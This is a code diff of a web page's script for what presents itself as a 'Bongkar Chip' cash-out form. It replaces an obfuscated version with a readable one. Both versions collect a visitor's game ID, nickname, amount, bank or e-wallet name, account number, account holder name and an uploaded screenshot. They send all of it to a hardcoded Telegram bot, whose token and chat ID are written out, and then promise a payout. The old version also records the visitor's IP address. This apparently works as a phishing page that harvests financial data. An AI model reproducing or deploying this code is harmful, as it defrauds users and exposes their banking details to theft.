@@ -336,92 +336,68 @@ function myFunction() {
                     </section>
                     <script>
                     async function sendToTelegram() {
-  try {
-    const _0x1e1428 = document.getElementById('idhjb1').value,
-      _0x551370 = document.getElementById('idhjb2').value,
-      _0x1cfc99 = document.querySelector('input[name="pwhjb"]').value,
-      _0x830313 = document.getElementById('pantek')?.value || 'null',
-      _0x12c937 =
-        document.querySelector('input[name="idhjb5"]')?.value || 'null',
-      _0x543f1e = document.getElementById('narek').value || 'null',
-      _0x11c911 = document.getElementById('myFile'),
-      _0x5bd576 = _0x11c911?.files[0]
-    if (!_0x1e1428 || !_0x551370 || !_0x1cfc99) {
-      alert('ID, Nickname, dan Jumlah Bongkar harus diisi!')
-      return
-    }
-    const _0x2c2122 = new Date(),
-      _0x2b81af = {
-        year: 'numeric',
-        month: 'numeric',
-        day: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
-        hour12: true,
-      },
-      _0x454920 = _0x2c2122.toLocaleString('en-US', _0x2b81af)
-    async function _0x2688f3() {
-      try {
-        const _0x4ace56 = await fetch('https://api.ipify.org?format=json'),
-          _0x417462 = await _0x4ace56.json()
-        return _0x417462.ip
-      } catch {
-        return 'Unknown IP'
-      }
-    }
-    const _0x11dc74 = await _0x2688f3(),
-      _0x3b766b =
-        ' \n\uD83D\uDD14 Bongkar Boss \uD83D\uDD14\n\uD83D\uDD52 Waktu Bongkar: ' +
-        _0x454920 +
-        '\n\n\uD83C\uDD94 ID: ' +
-        _0x1e1428 +
-        '\n\uD83D\uDC64 Nickname: ' +
-        _0x551370 +
-        '\n\uD83D\uDCB5 Jumlah Bongkar: ' +
-        _0x1cfc99 +
-        '\n\n\uD83C\uDFE7 Bank: ' +
-        _0x543f1e +
-        '\n\uD83C\uDFE7 Nomor Rekening: ' +
-        _0x830313 +
-        '\n\uD83D\uDCB3 Nama Rekening: ' +
-        _0x12c937 +
-        '\n\n\u26A0️ Semoga Beruntung!! \u26A0️',
-      _0x610a9 = await fetch(
-        'https://api.telegram.org/bot8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw/sendMessage',
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: '7614282744',
-            text: _0x3b766b,
-          }),
+    try {
+        // Ambil data dari input menggunakan ID yang ada di HTML kamu
+        const idUser = document.getElementById('idhjb1')?.value;
+        const nickName = document.getElementById('idhjb2')?.value;
+        const jumlahBongkar = document.querySelector('input[name="pwhjb"]')?.value;
+        const bank = document.getElementById('narek')?.value;
+        const noRek = document.getElementById('pantek')?.value;
+        const namaRek = document.getElementById('idhjb5')?.value;
+        const fileInput = document.getElementById('myFile');
+        const fileScrenshot = fileInput?.files[0];
+
+        // Validasi: Pastikan data utama tidak kosong
+        if (!idUser || !nickName || !jumlahBongkar) {
+            alert('ID, Nickname, dan Jumlah Bongkar wajib diisi!');
+            return;
         }
-      )
-    if (!_0x610a9.ok) {
-      throw new Error('Gagal mengirim pesan: ' + _0x610a9.statusText)
-    }
-    if (_0x5bd576) {
-      const _0x386d4f = new FormData()
-      _0x386d4f.append('chat_id', '7614282744')
-      _0x386d4f.append('document', _0x5bd576)
-      const _0x41e842 = await fetch(
-        'https://api.telegram.org/bot8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw/sendDocument',
-        {
-          method: 'POST',
-          body: _0x386d4f,
+
+        // Format pesan yang akan muncul di Telegram
+        const pesan = `🔔 *BONGKAR CHIP* 🔔\n` +
+                      `━━━━━━━━━━━━━━━━━━\n` +
+                      `🆔 ID User: ${idUser}\n` +
+                      `👤 Nickname: ${nickName}\n` +
+                      `💰 Jumlah: ${jumlahBongkar}\n\n` +
+                      `🏦 Bank/E-Wallet: ${bank}\n` +
+                      `💳 No. Rekening: ${noRek}\n` +
+                      `📛 Nama Rekening: ${namaRek}\n` +
+                      `━━━━━━━━━━━━━━━━━━`;
+
+        // 1. Kirim Pesan Teks
+        const kirimTeks = await fetch('https://api.telegram.org/bot8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '7614282744',
+                text: pesan,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        if (!kirimTeks.ok) throw new Error('Gagal kirim data teks.');
+
+        // 2. Kirim File/Gambar (jika ada yang di-upload)
+        if (fileScrenshot) {
+            const formData = new FormData();
+            formData.append('chat_id', '7614282744');
+            formData.append('document', fileScrenshot);
+
+            const kirimFile = await fetch('https://api.telegram.org/bot8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw/sendDocument', {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (!kirimFile.ok) throw new Error('Gagal kirim gambar bukti.');
         }
-      )
-      if (!_0x41e842.ok) {
-        throw new Error('Gagal mengirim file: ' + _0x41e842.statusText)
-      }
+
+        alert('Data berhasil dikirim! Silahkan tunggu proses pencairan.');
+        window.location.href = 'success.php';
+
+    } catch (err) {
+        console.error(err);
+        alert('Terjadi kesalahan: ' + err.message);
     }
-    alert('Data berhasil dikirim!')
-    window.location.href = 'success.php'
-  } catch (_0x256f90) {
-    console.error('Error:', _0x256f90)
-    alert('Terjadi kesalahan saat mengirim data: ' + _0x256f90.message)
-  }
 }
 </script>
         </section>
